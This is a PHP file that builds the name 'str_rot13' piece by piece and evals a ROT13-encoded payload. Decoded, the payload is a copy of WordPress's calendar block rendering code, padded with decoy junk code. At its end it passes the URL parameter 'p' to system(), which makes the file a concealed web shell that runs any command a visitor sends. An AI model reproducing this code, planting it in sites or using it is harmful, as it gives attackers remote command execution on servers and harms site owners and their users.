<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/pnyraqne` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/pnyraqne` oybpx ba freire.
 *
 * @fvapr 5.2.0
 *
 * @tybony vag $zbaguahz.
 * @tybony vag $lrne.
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 *
 * @erghea fgevat Ergheaf gur oybpx pbagrag.
 */
shapgvba eraqre_oybpx_pber_pnyraqne( $nggevohgrf ) {
	tybony $zbaguahz, $lrne;

	// Pnyraqne fubhyqa'g or eraqrerq
	// jura gurer ner ab choyvfurq cbfgf ba gur fvgr.
	vs ( ! oybpx_pber_pnyraqne_unf_choyvfurq_cbfgf() ) {
		vs ( vf_hfre_ybttrq_va() ) {
			erghea '<qvi>' . __( 'Gur pnyraqne oybpx vf uvqqra orpnhfr gurer ner ab choyvfurq cbfgf.' ) . '</qvi>';
		}
		erghea '';
	}

	$cerivbhf_zbaguahz = $zbaguahz;
	$cerivbhf_lrne     = $lrne;

	vs ( vffrg( $nggevohgrf['zbagu'] ) && vffrg( $nggevohgrf['lrne'] ) ) {
		$creznyvax_fgehpgher = trg_bcgvba( 'creznyvax_fgehpgher' );
		vs (
			fge_pbagnvaf( $creznyvax_fgehpgher, '%zbaguahz%' ) &&
			fge_pbagnvaf( $creznyvax_fgehpgher, '%lrne%' )
		) {
			$zbaguahz = $nggevohgrf['zbagu'];
			$lrne     = $nggevohgrf['lrne'];
		}
	}

	$pbybe_oybpx_fglyrf = neenl();

	// Grkg pbybe.
	$cerfrg_grkg_pbybe          = neenl_xrl_rkvfgf( 'grkgPbybe', $nggevohgrf ) ? \"ine:cerfrg|pbybe|{$nggevohgrf['grkgPbybe']}\" : ahyy;
	$phfgbz_grkg_pbybe          = $nggevohgrf['fglyr']['pbybe']['grkg'] ?? ahyy;
	$pbybe_oybpx_fglyrf['grkg'] = $cerfrg_grkg_pbybe ? $cerfrg_grkg_pbybe : $phfgbz_grkg_pbybe;

	// Onpxtebhaq Pbybe.
	$cerfrg_onpxtebhaq_pbybe          = neenl_xrl_rkvfgf( 'onpxtebhaqPbybe', $nggevohgrf ) ? \"ine:cerfrg|pbybe|{$nggevohgrf['onpxtebhaqPbybe']}\" : ahyy;
	$phfgbz_onpxtebhaq_pbybe          = $nggevohgrf['fglyr']['pbybe']['onpxtebhaq'] ?? ahyy;
	$pbybe_oybpx_fglyrf['onpxtebhaq'] = $cerfrg_onpxtebhaq_pbybe ? $cerfrg_onpxtebhaq_pbybe : $phfgbz_onpxtebhaq_pbybe;

	// Trarengr pbybe fglyrf naq pynffrf.
	$fglyrf        = jc_fglyr_ratvar_trg_fglyrf( neenl( 'pbybe' => $pbybe_oybpx_fglyrf ), neenl( 'pbaireg_inef_gb_pynffanzrf' => gehr ) );
	$vayvar_fglyrf = rzcgl( $fglyrf['pff'] ) ? '' : fcevags( ' fglyr=\"%f\"', rfp_ngge( $fglyrf['pff'] ) );
	$pynffanzrf    = rzcgl( $fglyrf['pynffanzrf'] ) ? '' : ' ' . rfp_ngge( $fglyrf['pynffanzrf'] );
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffanzrf .= ' unf-yvax-pbybe';
	}
	// Nccyl pbybe pynffrf naq fglyrf gb gur pnyraqne.
	$pnyraqne = fge_ercynpr( '<gnoyr', '<gnoyr' . $vayvar_fglyrf, trg_pnyraqne( gehr, snyfr ) );
	$pnyraqne = fge_ercynpr( 'pynff=\"jc-pnyraqne-gnoyr', 'pynff=\"jc-pnyraqne-gnoyr' . $pynffanzrf, $pnyraqne );

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	$bhgchg             = fcevags(
		'<qvi %1$f>%2$f</qvi>',
		$jenccre_nggevohgrf,
		$pnyraqne
	);

	$zbaguahz = $cerivbhf_zbaguahz;
	$lrne     = $cerivbhf_lrne;

	erghea $bhgchg;
}

/**
 * Ertvfgref gur `pber/pnyraqne` oybpx ba freire.
 *
 * @fvapr 5.2.0
 */
shapgvba ertvfgre_oybpx_pber_pnyraqne() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/pnyraqne',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_pnyraqne',
		)
	);
}

nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_pnyraqne' );

/**
 * Ergheaf jurgure be abg gurer ner nal choyvfurq cbfgf.
 *
 * Hfrq gb uvqr gur pnyraqne oybpx jura gurer ner ab choyvfurq cbfgf.
 * Guvf pbzcrafngrf sbe n xabja Pber oht: uggcf://pber.genp.jbeqcerff.bet/gvpxrg/12016
 *
 * @fvapr 5.9.0
 *
 * @erghea obby Unf nal choyvfurq cbfgf be abg.
 */
shapgvba oybpx_pber_pnyraqne_unf_choyvfurq_cbfgf() {
	// Zhygvfvgr nyernql unf na bcgvba gung fgberf gur pbhag bs gur choyvfurq cbfgf.
	// Yrg'f hfr gung sbe zhygvfvgrf.
	vs ( vf_zhygvfvgr() ) {
		erghea 0 < (vag) trg_bcgvba( 'cbfg_pbhag' );
	}

	// Ba fvatyr fvgrf jr gel bhe bja pnpurq bcgvba svefg.
	$unf_choyvfurq_cbfgf = trg_bcgvba( 'jc_pnyraqne_oybpx_unf_choyvfurq_cbfgf', ahyy );
	vs ( ahyy !== $unf_choyvfurq_cbfgf ) {
		erghea (obby) $unf_choyvfurq_cbfgf;
	}

	// Ab pnpur uvg, yrg'f hcqngr gur pnpur naq erghea gur pnpurq inyhr.
	erghea oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfgf();
}

/**
 * Dhrevrf gur qngnonfr sbe nal choyvfurq cbfg naq fnirf
 * n synt jurgure nal choyvfurq cbfg rkvfgf be abg.
 *
 * @fvapr 5.9.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @erghea obby Unf nal choyvfurq cbfgf be abg.
 */
shapgvba oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfgf() {
	tybony $jcqo;
	$unf_choyvfurq_cbfgf = (obby) $jcqo->trg_ine( \"FRYRPG 1 nf grfg SEBZ {$jcqo->cbfgf} JURER cbfg_glcr = 'cbfg' NAQ cbfg_fgnghf = 'choyvfu' YVZVG 1\" );
	hcqngr_bcgvba( 'jc_pnyraqne_oybpx_unf_choyvfurq_cbfgf', $unf_choyvfurq_cbfgf );
	erghea $unf_choyvfurq_cbfgf;
}

// Jr bayl jnag gb ertvfgre gurfr shapgvbaf naq npgvbaf jura
// jr ner ba fvatyr fvgrf. Ba zhygv fvgrf jr hfr `cbfg_pbhag` bcgvba.
vs ( ! vf_zhygvfvgr() ) {
	/**
	 * Unaqyre sbe hcqngvat gur unf choyvfurq cbfgf synt jura n cbfg vf qryrgrq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $cbfg_vq Qryrgrq cbfg VQ.
	 */
	shapgvba oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfg_ba_qryrgr( $cbfg_vq ) {
		$cbfg = trg_cbfg( $cbfg_vq );

		vs ( ! $cbfg || 'choyvfu' !== $cbfg->cbfg_fgnghf || 'cbfg' !== $cbfg->cbfg_glcr ) {
			erghea;
		}

		oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfgf();
	}

	/**
	 * Unaqyre sbe hcqngvat gur unf choyvfurq cbfgf synt jura n cbfg fgnghf punatrf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat  $arj_fgnghf Gur fgnghf gur cbfg vf punatvat gb.
	 * @cnenz fgevat  $byq_fgnghf Gur fgnghf gur cbfg vf punatvat sebz.
	 * @cnenz JC_Cbfg $cbfg       Cbfg bowrpg.
	 */
	shapgvba oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfg_ba_genafvgvba_cbfg_fgnghf( $arj_fgnghf, $byq_fgnghf, $cbfg ) {
		vs ( $arj_fgnghf === $byq_fgnghf ) {
			erghea;
		}

		vs ( 'cbfg' !== trg_cbfg_glcr( $cbfg ) ) {
			erghea;
		}

		vs ( 'choyvfu' !== $arj_fgnghf && 'choyvfu' !== $byq_fgnghf ) {
			erghea;
		}

		oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfgf();
	}

	nqq_npgvba( 'qryrgr_cbfg', 'oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfg_ba_qryrgr' );
	nqq_npgvba( 'genafvgvba_cbfg_fgnghf', 'oybpx_pber_pnyraqne_hcqngr_unf_choyvfurq_cbfg_ba_genafvgvba_cbfg_fgnghf', 10, 3 );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>